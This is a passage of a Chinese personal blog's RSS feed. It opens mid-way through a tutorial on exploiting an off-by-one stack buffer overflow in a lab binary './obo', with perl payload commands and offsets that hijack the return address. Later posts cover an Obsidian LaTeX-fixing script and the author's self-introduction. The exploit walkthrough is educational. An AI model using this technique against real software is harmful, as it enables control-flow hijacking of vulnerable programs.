&lt;p&gt;当执行 &lt;code&gt;buf[sizeof(buf)] = &#39;\0&#39;;&lt;/code&gt; 时，保存的帧指针 (&lt;code&gt;ebp&lt;/code&gt;) 的最低有效字节被设置为 &lt;code&gt;0&lt;/code&gt;。为了确保 &lt;code&gt;ebp&lt;/code&gt; 在被部分覆盖后仍然指向 &lt;code&gt;buf&lt;/code&gt; 区域内，需要至少 1024 字节的缓冲区。具体来说，需要覆盖 &lt;code&gt;ebp&lt;/code&gt;，使其保持在合理范围内（最高到 &lt;code&gt;0xff&lt;/code&gt;），这就是为什么缓冲区设置为 &lt;code&gt;0xff * 4&lt;/code&gt; 字节的原因。&lt;/p&gt;
&lt;h2 id=&#34;理解-foo-返回时的汇编命令&#34;&gt;理解 &lt;code&gt;foo&lt;/code&gt; 返回时的汇编命令
&lt;/h2&gt;&lt;p&gt;当 &lt;code&gt;foo&lt;/code&gt; 函数返回时，通常会执行以下关键的汇编指令：&lt;/p&gt;
&lt;h3 id=&#34;1-leave-指令&#34;&gt;1. &lt;code&gt;leave&lt;/code&gt; 指令
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;leave&lt;/code&gt; 指令等价于：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov esp, ebp
pop ebp
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mov esp, ebp&lt;/code&gt;：将栈指针 (&lt;code&gt;esp&lt;/code&gt;) 设置为帧指针 (&lt;code&gt;ebp&lt;/code&gt;) 的值，恢复栈指针到当前栈帧的顶部，从而释放当前函数占用的空间。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pop ebp&lt;/code&gt;：将栈顶的值弹出并赋给帧指针 (&lt;code&gt;ebp&lt;/code&gt;)，从而恢复调用者的帧指针。实际上，相当于将返回地址写入 &lt;code&gt;ebp&lt;/code&gt;，这意味着将栈中的值（通常是调用者的帧地址）赋给 &lt;code&gt;ebp&lt;/code&gt;，从而恢复调用者的栈帧。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;leave&lt;/code&gt; 的作用是将 &lt;code&gt;esp&lt;/code&gt; 恢复到函数调用前的位置，并弹出保存的 &lt;code&gt;ebp&lt;/code&gt;。如果 &lt;code&gt;ebp&lt;/code&gt; 被覆盖为指向某个特殊地址（例如缓冲区内的地址），在函数返回时可能导致错误的栈指针位置。&lt;/p&gt;
&lt;h3 id=&#34;2-ret-指令&#34;&gt;2. &lt;code&gt;ret&lt;/code&gt; 指令
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;ret&lt;/code&gt; 指令从栈顶弹出一个地址并跳转到该地址：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;pop eip
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果返回地址被覆盖为 &lt;code&gt;bar&lt;/code&gt; 函数的地址，执行流将跳转到 &lt;code&gt;bar&lt;/code&gt;，允许攻击者执行任意代码。本质上，&lt;code&gt;ret&lt;/code&gt; 会将一个地址弹出到指令指针 (&lt;code&gt;eip&lt;/code&gt;) 并跳转到该地址继续执行。&lt;/p&gt;
&lt;h2 id=&#34;攻击步骤&#34;&gt;攻击步骤
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;当执行命令 &lt;code&gt;perl -e &#39;system &amp;quot;./obo&amp;quot;, &amp;quot;\x38\x84\x04\x08&amp;quot;x256&#39;&lt;/code&gt; 时，程序会将这些重复的字节作为输入传递给 &lt;code&gt;./obo&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;foo&lt;/code&gt; 函数返回时，执行了 &lt;code&gt;leave&lt;/code&gt; 和 &lt;code&gt;ret&lt;/code&gt; 指令，由于返回地址被覆盖，程序跳转到 &lt;code&gt;bar&lt;/code&gt; 函数，打印出成功的消息多次。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进一步分析确定有效的覆盖位置&#34;&gt;进一步分析：确定有效的覆盖位置
&lt;/h2&gt;&lt;p&gt;为了成功执行攻击，关键在于精确确定需要覆盖哪些字节，以有效地操控控制流。在这个例子中，溢出发生在执行 &lt;code&gt;buf[sizeof(buf)] = &#39;\0&#39;&lt;/code&gt; 时，导致保存的帧指针 (&lt;code&gt;ebp&lt;/code&gt;) 的最低有效字节被设置为 &lt;code&gt;0&lt;/code&gt;。因此，需要调整 &lt;code&gt;ebp&lt;/code&gt; 的值，确保其指向缓冲区区域，从而使执行流程按预期进行，最终跳转到 &lt;code&gt;bar&lt;/code&gt; 函数。&lt;/p&gt;
&lt;p&gt;基于进一步的分析和测试，得出以下见解：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;要准确确定覆盖位置，&lt;code&gt;ebp&lt;/code&gt; 的值至关重要。然而，获得这个值是有挑战的，因为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;GDB 调试会影响地址布局。&lt;/li&gt;
&lt;li&gt;输入参数的长度会影响地址布局。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 GDB 调试下，&lt;code&gt;foo&lt;/code&gt; 函数内的布局如下：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行 &lt;code&gt;buf[sizeof(buf)] = &#39;\0&#39;;&lt;/code&gt; 后，&lt;code&gt;ebp&lt;/code&gt; 被修改，使得返回地址实际上取的是 &lt;code&gt;ebp + 1&lt;/code&gt; 处的值，即地址 &lt;code&gt;0xbfffed00 + 1&lt;/code&gt;，也就是 &lt;code&gt;0xbfffed04&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对应的偏移位置在 &lt;code&gt;buf&lt;/code&gt; 的第 255 个位置，这意味着可以通过只在该特定位置填入返回地址来构造攻击。在 GDB 中使用以下命令进行验证：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;perl -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print  &amp;#34;\x01\x01\x01\x01&amp;#34;x254 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x1&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;经过验证，这在 GDB 调试下是有效的，但需要注意以下细节：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;输入参数的长度必须始终为 256 字节，否则 &lt;code&gt;ebp&lt;/code&gt; 的值会发生变化，因为输入参数会占用栈空间，从而影响帧的起始位置，进而影响 &lt;code&gt;ebp&lt;/code&gt; 的值。&lt;/li&gt;
&lt;li&gt;填充必须使用非零值，如 &lt;code&gt;0x01&lt;/code&gt;，因为如果遇到 &lt;code&gt;0&lt;/code&gt; 值，&lt;code&gt;strncpy&lt;/code&gt; 会提前终止。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;直接执行程序时（即不使用 GDB），内存布局不同，导致偏移位置也不同。通过实验，发现偏移位置在第 235 个位置。对应的攻击命令是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./obo &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;perl -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print  &amp;#34;\x01\x01\x01\x01&amp;#34;x234 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x21&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这样就实现了找到准确覆盖位置并成功执行攻击的效果。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>将ChatGPT公式格式转换为Obsidian兼容格式</title>
        <link>https://nansenli.com/zh-cn/post/2024/10/obsidian-latex-fix/</link>
        <pubDate>Mon, 14 Oct 2024 15:24:27 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2024/10/obsidian-latex-fix/</guid>
        <description>&lt;p&gt;ChatGPT生成的公式使用了以下格式：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;\[
公式内容
\]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而Obsidian中的公式渲染使用的是以下格式：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$$
公式内容
$$
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当我们将ChatGPT的公式复制到Obsidian中时，这种差异会导致无法正确渲染。&lt;/p&gt;
&lt;h2 id=&#34;解决方案&#34;&gt;解决方案
&lt;/h2&gt;&lt;p&gt;我们可以创建一个Obsidian脚本，在粘贴操作时自动替换公式的格式。&lt;/p&gt;
&lt;h3 id=&#34;1-创建脚本&#34;&gt;1. 创建脚本
&lt;/h3&gt;&lt;p&gt;可以使用Obsidian中的插件来解决这个问题。&lt;/p&gt;
&lt;p&gt;在你的库中，在&lt;code&gt;template&lt;/code&gt;目录下创建一个文件&lt;code&gt;fixlatex.js&lt;/code&gt;，并输入以下内容：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;quickAddApi&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 获取剪贴板内容
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardContent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;quickAddApi&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;utility&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getClipboard&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 检查是否成功获取内容
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardContent&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Notice&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;剪贴板为空或无法访问。&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;modifiedContent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardContent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;/\\\[|\\\]/g&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$$$$&amp;#39;&lt;/span&gt;)              &lt;span style=&#34;color:#75715e&#34;&gt;// 转换 \[ \] 为 $$ $$
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        .&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;/\\\(\s*|\s*\\\)/g&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$$&amp;#39;&lt;/span&gt;);       &lt;span style=&#34;color:#75715e&#34;&gt;// 转换 \( \) 为 $
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 将修改后的内容写回剪贴板
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;navigator&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;clipboard&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeText&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;modifiedContent&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Notice&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;剪贴板内容已处理并修改！&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2-在quickadd中设置脚本&#34;&gt;2. 在QuickAdd中设置脚本
&lt;/h3&gt;&lt;p&gt;安装QuickAdd插件，并创建一个&lt;code&gt;Macro&lt;/code&gt;，按如下图中的配置进行设置并保存。Macro的第一步是执行我们刚刚创建的用户脚本&lt;code&gt;fixlatex.js&lt;/code&gt;，第二步是等待100毫秒，第三步是执行粘贴操作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/grA8L8V.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;3-在commander中设置侧边快捷键&#34;&gt;3. 在Commander中设置侧边快捷键
&lt;/h3&gt;&lt;p&gt;安装Commander插件，并将刚刚创建的QuickAdd操作设置为侧边栏的快捷键。你也可以跳过这一步，直接使用Obsidian命令执行这个操作。&lt;/p&gt;
&lt;h3 id=&#34;4-验证效果&#34;&gt;4. 验证效果
&lt;/h3&gt;&lt;p&gt;现在，在ChatGPT的网页中（目前在APP中点击复制按钮似乎有点问题），点击复制按钮后，在Obsidian中点击侧边栏快捷键，或者手动执行QuickAdd命令，就可以将ChatGPT中的内容复制到Obsidian中，并自动转换Latex格式。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>关于我</title>
        <link>https://nansenli.com/zh-cn/post/2024/10/aboutme/</link>
        <pubDate>Fri, 11 Oct 2024 20:55:02 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2024/10/aboutme/</guid>
        <description>&lt;h1 id=&#34;关于我&#34;&gt;关于我
&lt;/h1&gt;&lt;p&gt;本文书写于 2024年10月11日，都柏林，爱尔兰。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;自我介绍&#34;&gt;自我介绍
&lt;/h2&gt;&lt;p&gt;大家好，我叫李楠森，曾用名李楠。我来自中国，是一名热爱科技的工程师。我拥有机械电子的本科学位和两个计算机科学的硕士学位。我曾在中国一家大型互联网公司担任过 Go 语言工程师，目前正在都柏林一所大学攻读硕士学位。之后计划在爱尔兰发展。&lt;/p&gt;
&lt;p&gt;我对前端和后端开发、系统架构、算法、游戏开发，以及生成式 AI 有着浓厚的兴趣。我一直致力于提高自己的编程能力，也喜欢尝试新技术，保持对行业发展的敏感度。&lt;/p&gt;
&lt;p&gt;除了软件开发设计外，我也有其他各种各样的背景。我曾经参加过嵌入式系统设计、机械软件设计，曾经焊接过电路板，设计过电子元器件，包括放大器等检测电路和模拟摄像头或数字摄像头等功能元件，了解控制系统和控制过程，例如PID。绘制工程图，例如汽车汽缸等模型，使用AutoCAD建模等。参与嵌入式防火墙设计。我还拥有带领不同队伍参加编程或者电子设计的竞赛经历。&lt;/p&gt;
&lt;p&gt;如果你对技术或者生活方式有相同的兴趣，欢迎联系我，我们可以一起讨论和交流。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>我的博客</title>
        <link>https://nansenli.com/zh-cn/post/2024/10/myblog/</link>
        <pubDate>Thu, 10 Oct 2024 21:06:26 +0000</pubDate>
        
        <guid>https://nansenli.com/zh-cn/post/2024/10/myblog/</guid>
        <description>&lt;p&gt;我是李楠森，这里是我的第一篇笔记，我不知道我能记录多少内容，也不知道能记录多久，但是我会尽力坚持去记录。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;于 2024年10月11日凌晨 1点20分 爱尔兰 都柏林&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        
    </channel>
</rss>
